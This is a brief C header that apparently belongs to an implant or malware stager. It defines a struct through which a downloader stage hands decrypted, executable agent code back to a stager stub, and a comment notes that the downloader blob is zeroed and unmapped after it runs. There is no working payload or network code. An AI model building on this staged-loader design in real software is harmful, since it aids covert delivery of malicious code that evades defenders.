#ifndef STAGER_STAGE_ABI_H
#define STAGER_STAGE_ABI_H

#include <stddef.h>

/*
 * ABI between the stager stub and the downloader stage.
 *
 * The downloader runs from a separate, position-independent blob that the
 * stub maps, runs, then zeroes and unmaps. It returns the decrypted agent PIC
 * through this struct; the PIC lives in its own mapping and outlives the
 * downloader.
 */
struct download_result {
  char *data;   /* decrypted, executable agent PIC (mmap'd) */
  size_t size;  /* number of valid bytes in data */
};

#endif /* STAGER_STAGE_ABI_H */
